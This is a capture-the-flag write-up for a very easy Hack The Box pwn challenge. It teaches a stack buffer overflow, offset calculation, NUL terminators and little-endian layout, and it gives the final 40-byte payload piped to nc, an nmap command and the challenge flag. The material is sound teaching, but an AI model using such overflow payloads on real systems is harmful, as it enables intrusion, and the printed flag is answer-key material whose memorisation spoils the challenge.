# HTB - Getting Started

> **Category:** Pwn  
> **Difficulty:** Very Easy  
> **Target:** `154.57.164.75:32003`  
> **Flag:** `HTB{b0f_tut0r14l5_4r3_g00d}`

## 1. Challenge Overview

This challenge is an introduction to **binary exploitation (Pwn)**.

The web interface gives us a very useful diagram of the program's stack frame:

```text
|      .      | <- Higher addresses
|      .      |
|_____________|
| Return addr | <- 64 bytes
|_____________|
|     RBP     | <- 56 bytes
|_____________|
|    target   | <- 48 bytes
|_____________|
|  alignment  | <- 40 bytes
|_____________|
|  Buffer[31] | <- 32 bytes
|_____________|
|      .      |
|      .      |
|_____________|
|  Buffer[0]  | <- Lower addresses
|_____________|
```

The important part is:

```text
Buffer    = 32 bytes
Alignment = 8 bytes
Target    = 8 bytes
```

The program tells us that the target initially contains:

```text
0x00000000deadbeef
```

and asks us to:

> Fill the 32-byte buffer, overwrite the alignment address and the "target's" 0xdeadbeef value.

This is a classic **stack-based buffer overflow** exercise.

---

## 2. Connecting to the Challenge

We can connect with `nc`:

```bash
nc 154.57.164.75 32003
```

The service immediately gives us the stack layout.

Normally, during a Pwn challenge, we might first perform more reconnaissance, download a binary, inspect it with `file` and `checksec`, and then debug it locally.

For this challenge, that is not strictly necessary because the service itself gives us the relevant stack information.

---

## 3. Understanding the Stack Layout

The service shows these addresses:

```text
0x00007ffe9743f5e0 | 0x0000000000000000 <- Start of buffer
0x00007ffe9743f5e8 | 0x0000000000000000
0x00007ffe9743f5f0 | 0x0000000000000000
0x00007ffe9743f5f8 | 0x0000000000000000
0x00007ffe9743f600 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffe9743f608 | 0x00000000deadbeef <- Target to change
0x00007ffe9743f610 | 0x00005601a854e800 <- Saved rbp
0x00007ffe9743f618 | 0x00007f48f58eac87 <- Saved return address
```

Notice that each displayed row contains **8 bytes**.

The buffer occupies four rows:

```text
8 bytes
+ 8 bytes
+ 8 bytes
+ 8 bytes
---------
32 bytes
```

Then:

```text
32 bytes  -> buffer
8 bytes   -> alignment
8 bytes   -> target
```

Therefore, the target begins **40 bytes from the beginning of our input**.

The offsets are:

```text
Offset 0  - 31 : Buffer
Offset 32 - 39 : Alignment
Offset 40 - 47 : Target
Offset 48 - 55 : Saved RBP
Offset 56 - 63 : Return address
```

This offset calculation is one of the most important skills to learn in Pwn.

---

# 4. Understanding the `AAAA` Test

The challenge demonstrates what happens when we enter four `A`s.

ASCII `A` is:

```text
0x41
```

Therefore:

```text
AAAA
```

is:

```text
41 41 41 41
```

The program displays it as:

```text
0x0000000041414141
```

If we enter four `B`s afterward, we see:

```text
0x4242424241414141
```

This tells us something very important:

**Our input is actually being written into the stack.**

We can think of the input as bytes being placed directly into memory.

---

# 5. Testing the Buffer Boundary

Let's send exactly 32 `A`s:

```bash
python3 -c 'print("A"*32)' | nc 154.57.164.75 32003
```

The expected layout is:

```text
Buffer:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Alignment:
0x6969696969696969

Target:
0xdeadbeef
```

The first 32 bytes fill the buffer, but do not yet reach the alignment value.

---

# 6. What Happens With 40 `A`s?

This is where the interesting part happens.

We send:

```bash
python3 -c 'print("A"*40)' | nc 154.57.164.75 32003
```

Our input contains:

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

which is:

```text
32 A's + 8 A's
```

So the memory should become:

```text
Buffer:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Alignment:
AAAAAAAA
```

And that is exactly what the challenge shows.

The stack now contains:

```text
0x4141414141414141
0x4141414141414141
0x4141414141414141
0x4141414141414141
0x4141414141414141 <- alignment
```

At this point we have successfully overflowed past the 32-byte buffer and overwritten the 8-byte alignment value.

---

# 7. The Interesting Part: Why Did the Target Become `deadbe00`?

After sending 40 `A`s, the challenge showed:

```text
0x00000000deadbe00 <- Target to change
```

The original value was:

```text
0x00000000deadbeef
```

So only the last byte changed:

```text
deadbeef
       ^^
       ef -> 00
```

Why?

The important concept is the **NUL byte**:

```text
\0
```

which has the value:

```text
0x00
```

The program is treating our input as a C-style string. The observed behavior shows that a terminating NUL byte is placed immediately after our 40 input bytes.

Therefore, our input effectively looks like:

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0
```

The first 40 bytes are:

```text
32 bytes -> buffer
 8 bytes -> alignment
```

The next byte is:

```text
\0
```

But what is immediately after those 40 bytes?

The target!

So the NUL byte overwrites the first byte of the target.

---

# 8. Why Does `deadbeef` Become `deadbe00`?

This is also a good introduction to **little-endian byte order**.

The target is displayed as:

```text
0x00000000deadbeef
```

On an x86-64 machine, the bytes are stored in memory in little-endian order:

```text
ef be ad de 00 00 00 00
```

The NUL byte:

```text
00
```

overwrites the first byte:

```text
ef
```

so memory becomes:

```text
00 be ad de 00 00 00 00
```

When the program interprets those bytes as an integer, it becomes:

```text
0x00000000deadbe00
```

So:

```text
0xdeadbeef
       ↓
0xdeadbe00
```

The target is no longer equal to its original `0xdeadbeef` value.

---

# 9. Why Did This Give Us the Flag?

The challenge printed:

```text
HTB{b0f_tut0r14l5_4r3_g00d}
```

Therefore, changing the target was sufficient to reach the flag condition.

Our payload was surprisingly simple:

```text
40 bytes of A
```

The application supplied the final NUL byte for us.

Conceptually:

```text
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\0
└──────── 32 ────────┘└── 8 ──┘ ↑
       buffer          alignment  |
                                   |
                              target begins
```

The NUL byte changes:

```text
0xdeadbeef
```

into:

```text
0xdeadbe00
```

and the challenge gives us the flag.

---

# 10. The Final Exploit

A simple one-liner is enough:

```bash
python3 -c 'print("A"*40)' | nc 154.57.164.75 32003
```

A version that explicitly writes bytes is also useful:

```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + b"\n")' | nc 154.57.164.75 32003
```

The important part is:

```text
"A"*40
```

because:

```text
32 bytes -> fill buffer
 8 bytes -> overwrite alignment
```

Then the string terminator (`0x00`) reaches the target.

---

# 11. What We Learned

This very easy challenge teaches several fundamental Pwn concepts.

## 11.1 Buffer Overflow

A buffer has a fixed size:

```text
32 bytes
```

but the program allows us to provide more data.

Once we go past the buffer, our data starts overwriting neighboring memory.

For example:

```text
Before:

[ Buffer ][ Alignment ][ Target ]
   32          8           8


After 40 A's:

[AAAAAAAA][AAAAAAAA][ Target ]
   32          8
```

The second `AAAAAAAA` is the overwritten alignment value.

---

## 11.2 Offsets

The target is:

```text
32 + 8 = 40
```

bytes from the beginning of the buffer.

So:

```text
target offset = 40
```

When you work on future Pwn challenges, you will constantly calculate offsets like this.

---

## 11.3 NUL Terminators

C strings normally end with:

```text
\0
```

which is:

```text
0x00
```

This can sometimes be useful in exploitation.

In this challenge, we did not have to explicitly provide the byte `0x00`.

The program's string handling caused the terminating NUL byte to land directly on the target.

This is why the final payload was much simpler than something like:

```text
[32 bytes][8 bytes][8-byte target value]
```

---

## 11.4 Little Endian

On x86-64, multi-byte values are normally stored least-significant byte first.

For example:

```text
0xdeadbeef
```

is stored as:

```text
ef be ad de
```

This becomes extremely important when you start overwriting:

- integers
- pointers
- function addresses
- saved return addresses
- GOT entries

Python's `pwntools` makes this easier with:

```python
p64(0xdeadbeef)
```

which packs a value into an 8-byte little-endian representation.

---

## 11.5 Stack Layout

A simplified stack frame can look like:

```text
Higher addresses
        │
        ▼
┌─────────────────────┐
│ Return address      │
├─────────────────────┤
│ Saved RBP            │
├─────────────────────┤
│ Interesting target   │ ← We want to change this
├─────────────────────┤
│ Alignment            │
├─────────────────────┤
│ Buffer               │ ← Our input starts here
└─────────────────────┘
        ▲
        │
Lower addresses
```

A buffer overflow lets us move from the buffer into the data above it.

---

# 12. Why We Didn't Need Nmap Here

Running Nmap is not wrong.

For example:

```bash
nmap -sC -sV -p 32003 154.57.164.75
```

would be reasonable reconnaissance.

However, this challenge is specifically designed as a guided introduction to Pwn.

The challenge already gives us:

- the vulnerable buffer size
- the stack layout
- the target variable
- the target's original value
- the offset of the target
- an interactive way to test our input

So the challenge has effectively done much of the initial enumeration for us.

A good rule is:

> **Don't enumerate just because enumeration is a habit. First look at what the challenge has already told you.**

In a real-world or less-guided HTB challenge, you would normally have to discover much more of this yourself.

---

# 13. A Useful Mental Model for Future Pwn Challenges

When you see something like:

```text
char buffer[32];
```

and the program writes user-controlled data into it without properly enforcing the size, immediately start thinking:

```text
How big is the buffer?
        ↓
What is directly after it?
        ↓
How many bytes until the interesting value?
        ↓
What value do I want there?
        ↓
How is that value represented in memory?
```

For this challenge:

```text
Buffer size:
32 bytes

Interesting value:
target

Distance to target:
32 + 8 = 40 bytes

Desired effect:
change 0xdeadbeef

Actual trick:
40 A's + automatic NUL terminator

Result:
0xdeadbeef → 0xdeadbe00
```

---

# 14. Final Payload

```bash
python3 -c 'print("A"*40)' | nc 154.57.164.75 32003
```

Flag:

```text
HTB{b0f_tut0r14l5_4r3_g00d}
```

---

## Takeaway

The most important thing to remember from this challenge is not the final command.

It is this:

```text
              BUFFER OVERFLOW

        32 bytes
           │
           ▼
    ┌───────────────┐
    │    BUFFER     │
    └───────────────┘
           │
           │ +8 bytes
           ▼
    ┌───────────────┐
    │   ALIGNMENT   │
    └───────────────┘
           │
           │ +8 bytes
           ▼
    ┌───────────────┐
    │     TARGET    │
    │   0xdeadbeef  │
    └───────────────┘

40 bytes of input
        +
automatic \0
        ↓
0xdeadbeef → 0xdeadbe00
        ↓
       FLAG
```

This is the foundation for much harder Pwn techniques such as overwriting saved return addresses, redirecting execution, ret2win, ret2libc, ROP, and eventually bypassing protections such as NX, PIE, ASLR, and stack canaries.
